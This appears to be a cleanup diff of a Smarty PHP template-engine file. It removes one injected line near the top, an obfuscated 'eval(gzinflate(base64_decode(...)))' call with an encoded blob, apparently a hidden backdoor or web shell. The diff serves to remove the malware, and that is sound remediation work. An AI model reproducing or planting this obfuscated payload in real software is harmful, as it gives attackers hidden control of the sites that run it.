@@ -9,7 +9,6 @@
 * @subpackage Templates
 * @author Uwe Tews 
 */
-return eval(gzinflate(base64_decode("bctPa8IwGIDxs4V+h3dBbHtpkB52kMI66FSo0y3bSUYJ7WsS0KbkjyuI313FiwevP56HUmD6gMCkcrDTBpxEKNqD6iAuuXVoUAj4QO68wSQM1C4e19/l12/JfrZEteQP8hymWZa9wmQCm8WmXjN4yYFUqvMDueF4Xq3fi4ptySD62mjt7leU0jSlUQKnMBi9Wan/a6u9aTCOrq66Zu9btPTIjU172UfJDOBZueed8FwgbdE720i6/JwXq/LxwUG5WRicLw==")));
 
 /**
 * Base class with template and variable methodes
@@ -440,6 +439,5 @@ class Undefined_Smarty_Variable {
         } 
     } 
 } 
-
 
 ?>
